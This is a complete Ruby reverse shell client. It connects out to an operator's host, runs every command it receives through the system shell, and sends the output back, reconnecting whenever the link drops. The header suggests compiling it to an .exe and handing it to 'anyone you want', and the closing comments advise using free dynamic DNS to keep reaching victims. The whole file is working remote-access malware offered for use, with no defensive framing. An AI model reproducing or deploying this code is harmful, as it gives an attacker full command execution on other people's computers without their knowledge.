#
#  simple ruby reverse shell script ( a piece of my old garbage computer )
#  Client version -- usage: you can compile it to .exe and give it to anyone you want. 
# 

require 'socket'
require 'open3'

class Client

	def initialize(remote_ip,remote_port,use_dns=false)
		if use_dns
			@remote_host = IPSocket.getaddress(remote_ip.to_s) 
		else
			@remote_host = remote_ip.to_s
		end
		@remote_port = remote_port.to_i
		trap("INT") {exit!}
		live
	end

	def connect_to_server!
		begin
			@socket = TCPSocket.new(@remote_host, @remote_port)
			# puts "[+] Connected to the server"

		rescue Exception => e
			# puts "[!] SERVER CONNECTION ERROR\tRETRYING ...\nError: #{e}\nBacktrace: #{e.backtrace.inspect}"
			sleep(1)
			retry
		end
	end

	def live
		connect_to_server!
		begin
			while true
				line = @socket.gets.chomp
				@dir = Dir.pwd
				# puts "current dir: #{Dir.pwd}"
				if line =~ /cd (.+)/i
					Dir.chdir("#{$1}") {|dir| @dir = Dir.pwd}
					Dir.chdir "#{@dir}"
					# puts "changed dir: #{Dir.pwd}"
					@socket.puts("changed dir: #{Dir.pwd}".chomp)
					@socket.puts "END\0"
				else
					begin 
						Open3.popen2e("#{line}") do |stdin, stdout, wait_thr|
							@socket.puts "#{stdout.read}"
							@socket.puts "END\0"
						end
					rescue Exception => e
						error = "error in: #{e}"
						# puts error
						@socket.puts("#{error}".chomp)
						@socket.puts "END\0"
					end
				end

			end
		rescue Exception => e
			# puts "Error in: #{e}"
			sleep(1)
			connect_to_server!
			retry
		end
	end

end


# if your ip_address ins't static then you can use free dns providers like... noip etc.
# Client.new("remote_ip",2020,true) # just uncomment it

# if your ip_address is static then you can set the using_dns to false. 
# Client.new("remote_ip",2020,false) # just uncomment it